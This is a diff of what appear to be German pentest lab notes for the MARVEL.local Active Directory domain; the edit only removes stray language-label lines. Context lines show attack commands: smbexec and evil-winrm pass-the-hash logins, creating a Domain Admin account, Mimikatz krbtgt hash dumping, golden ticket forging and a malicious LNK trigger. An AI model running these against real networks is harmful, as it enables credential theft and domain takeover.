@@ -294,7 +294,6 @@ impacket-smbexec MARVEL.local/jdoe:Password1@192.168.xx.x
 
 ### Mimikatz Interactive Mode
 
-cmd
 
 ```cmd
 # Zum Temp-Verzeichnis
@@ -309,7 +308,6 @@ mimikatz.exe
 
 **In Mimikatz Prompt:**
 
-mimikatz
 
 ```mimikatz
 # Debug-Privilegien aktivieren
@@ -327,7 +325,6 @@ exit
 
 ### Direct Execution (Non-Interactive)
 
-cmd
 
 ```cmd
 # Alle Befehle in einer Zeile
@@ -420,7 +417,6 @@ whoami
 
 ### Domain User Creation
 
-cmd
 
 ```cmd
 # In impersonierter Administrator-Shell
@@ -429,7 +425,6 @@ net user /add hawkeye Password1@ /domain
 
 ### Domain Admins Group Addition
 
-cmd
 
 ```cmd
 # Deutsche Systeme
@@ -478,7 +473,6 @@ impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
 
 ### PowerShell LNK Creation
 
-powershell
 
 ```powershell
 # PowerShell starten
@@ -496,7 +490,6 @@ $lnk.Save()
 
 ### Trigger Execution
 
-cmd
 
 ````cmd
 # LNK-Datei ausführen
@@ -772,7 +765,6 @@ evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
 
 #### Mimikatz starten
 
-cmd
 
 ```cmd
 mimikatz.exe
@@ -780,7 +772,6 @@ mimikatz.exe
 
 #### Debug-Privilegien prüfen
 
-mimikatz
 
 ```mimikatz
 privilege::debug
@@ -790,7 +781,6 @@ privilege::debug
 
 #### krbtgt Hash extrahieren
 
-mimikatz
 
 ```mimikatz
 lsadump::lsa /inject /name:krbtgt
@@ -803,7 +793,6 @@ lsadump::lsa /inject /name:krbtgt
 
 #### Golden Ticket erstellen
 
-mimikatz
 
 ```mimikatz
 # Generisches Template
@@ -824,7 +813,6 @@ kerberos::golden /User:Batman /domain:marvel.local /sid:S-1-5-21-1234567890-1111
 
 #### CMD mit Golden Ticket
 
-mimikatz
 
 ```mimikatz
 misc::cmd
